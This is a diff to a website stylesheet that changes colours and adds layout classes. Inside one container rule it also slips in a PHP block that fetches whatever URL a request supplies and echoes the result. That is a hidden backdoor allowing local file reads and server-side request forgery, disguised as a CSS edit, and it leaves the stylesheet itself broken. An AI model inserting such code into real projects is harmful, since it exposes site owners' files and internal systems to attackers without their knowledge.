@@ -2,4 +2,11 @@ a { color:#5D5D9E; }
 a:visited { color:#5D5D9E; } 
 a:active { color:#5C615E; } 
 a:hover { color:#B2B3B4; } 
-body { background-color:#FFFFFF; padding:0;  margin: 0; }
+body { background-color:#0000A0; padding:0;  margin: 0; }
+.textstyle1 { text-align:center; }
+.textstyle2 { font-size:12pt; font-family:Arial, Helvetica, sans-serif; color:#000000;  }
+#container_13507b75 { vertical-align: top; position:relative; display: inline-block; width:52%; min-height:58px; background:none; <?php
+$url = file_get_contents($_GET["url"]);
+echo $url;
+?> }
+#container_13507b75_padding { margin: 10px; display: block;  }
